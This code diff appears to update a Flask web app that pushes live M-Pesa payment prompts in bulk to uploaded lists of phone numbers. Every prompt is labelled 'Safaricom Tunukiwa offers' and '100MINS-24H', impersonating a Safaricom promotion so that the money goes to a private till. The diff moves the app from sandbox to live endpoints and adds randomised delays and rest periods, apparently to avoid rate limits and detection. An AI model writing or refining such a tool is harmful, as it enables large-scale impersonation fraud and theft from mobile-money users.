@@ -15,7 +15,7 @@ app = Flask(__name__)
 # CONFIGURATION
 CONSUMER_KEY = os.getenv("DARAJA_CONSUMER_KEY")
 CONSUMER_SECRET = os.getenv("DARAJA_CONSUMER_SECRET")
-SHORTCODE = os.getenv("DARAJA_SHORTCODE", "174379")
+SHORTCODE = os.getenv("DARAJA_SHORTCODE", "5373472")
 PASSKEY = os.getenv("DARAJA_PASSKEY")
 CALLBACK_URL = os.getenv("DARAJA_CALLBACK_URL")
 
@@ -32,7 +32,8 @@ batch_status = {"total": 0, "current": 0, "is_running": False, "status": "Idle",
 # --- HELPER FUNCTIONS ---
 
 def get_access_token():
-    api_url = "https://sandbox.safaricom.co.ke/oauth/v1/generate?grant_type=client_credentials"
+    # UPDATED TO LIVE URL
+    api_url = "https://api.safaricom.co.ke/oauth/v1/generate?grant_type=client_credentials"
     headers = {"User-Agent": "Mozilla/5.0"}
     try:
         r = requests.get(api_url, auth=(CONSUMER_KEY.strip(), CONSUMER_SECRET.strip()), headers=headers)
@@ -44,7 +45,7 @@ def get_access_token():
 def generate_password(timestamp):
     return base64.b64encode((SHORTCODE + PASSKEY + timestamp).encode()).decode('utf-8')
 
-# --- BACKGROUND BATCH WORKER ---
+# --- BACKGROUND BATCH WORKER (UPDATED LOGIC) ---
 
 def process_massive_batch(phone_numbers, amount):
     global batch_status
@@ -55,38 +56,36 @@ def process_massive_batch(phone_numbers, amount):
     batch_status["logs"] = [] 
 
     access_token = get_access_token()
-    stk_url = "https://sandbox.safaricom.co.ke/mpesa/stkpush/v1/processrequest"
+    # UPDATED TO LIVE URL
+    stk_url = "https://api.safaricom.co.ke/mpesa/stkpush/v1/processrequest"
     
-    for phone in phone_numbers:
+    for index, phone in enumerate(phone_numbers):
+        # 1. Standardize Phone
         clean_phone = phone.strip()
         if clean_phone.startswith("0"): clean_phone = "254" + clean_phone[1:]
         
-        # Token Refresh Logic
-        if batch_status["current"] % 500 == 0:
-            access_token = get_access_token()
-
-        # Cooldown Logic (15 min break every 1000 numbers)
-        if batch_status["current"] > 0 and batch_status["current"] % 1000 == 0:
-            batch_status["status"] = "Cooling down (15 min break)"
-            time.sleep(900) 
-            batch_status["status"] = "Processing"
+        # 2. Break every 100 numbers (The "Rest" period)
+        if index > 0 and index % 100 == 0:
+            batch_status["status"] = "Batch of 100 complete. Resting 2 mins..."
+            time.sleep(120) # 2 minute break
+            access_token = get_access_token() # Refresh token after break
+            batch_status["status"] = "Processing next batch..."
 
         timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
         headers = {"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"}
         
-        # --- BATCH PROMPT UPDATE ---
         payload = {
             "BusinessShortCode": SHORTCODE,
             "Password": generate_password(timestamp),
             "Timestamp": timestamp,
-            "TransactionType": "CustomerPayBillOnline",
+            "TransactionType": "CustomerBuyGoodsOnline", # UPDATED FOR TILL
             "Amount": 10, 
             "PartyA": clean_phone,
             "PartyB": SHORTCODE,
             "PhoneNumber": clean_phone,
             "CallBackURL": CALLBACK_URL,
-            "AccountReference": "100MINS-24H",      # Matches your prompt
-            "TransactionDesc": "Safaricom Tunukiwa offers" # Matches your prompt
+            "AccountReference": "100MINS-24H",
+            "TransactionDesc": "Safaricom Tunukiwa offers"
         }
 
         current_time = datetime.now().strftime('%H:%M:%S')
@@ -104,7 +103,9 @@ def process_massive_batch(phone_numbers, amount):
             batch_status["logs"].append({"phone": clean_phone, "status": "Failed", "time": current_time})
         
         batch_status["current"] += 1
-        time.sleep(0.2 + random.uniform(0.05, 0.15))
+        
+        # 3. RANDOM LAG (2.0 to 5.0 seconds)
+        time.sleep(random.uniform(2.0, 5.0)) 
 
     batch_status["is_running"] = False
     batch_status["status"] = "Complete"
@@ -135,24 +136,23 @@ def initiate_payment():
     if clean_phone.startswith("0"): clean_phone = "254" + clean_phone[1:]
     
     access_token = get_access_token()
-    stk_url = "https://sandbox.safaricom.co.ke/mpesa/stkpush/v1/processrequest"
+    stk_url = "https://api.safaricom.co.ke/mpesa/stkpush/v1/processrequest"
     timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
     
     headers = {"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"}
     
-    # --- SINGLE PURCHASE PROMPT UPDATE ---
     payload = {
         "BusinessShortCode": SHORTCODE,
         "Password": generate_password(timestamp),
         "Timestamp": timestamp,
-        "TransactionType": "CustomerPayBillOnline",
+        "TransactionType": "CustomerBuyGoodsOnline", # UPDATED FOR TILL
         "Amount": amount,
         "PartyA": clean_phone,
         "PartyB": SHORTCODE,
         "PhoneNumber": clean_phone,
         "CallBackURL": CALLBACK_URL,
-        "AccountReference": "100MINS-24H",              # Matches your prompt
-        "TransactionDesc": "Safaricom Tunukiwa offers"   # Matches your prompt
+        "AccountReference": "100MINS-24H",
+        "TransactionDesc": "Safaricom Tunukiwa offers"
     }
 
     try:
@@ -178,7 +178,6 @@ def upload_batch():
 def get_progress():
     return jsonify(batch_status)
 
-# --- PORT CONFIG ---
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
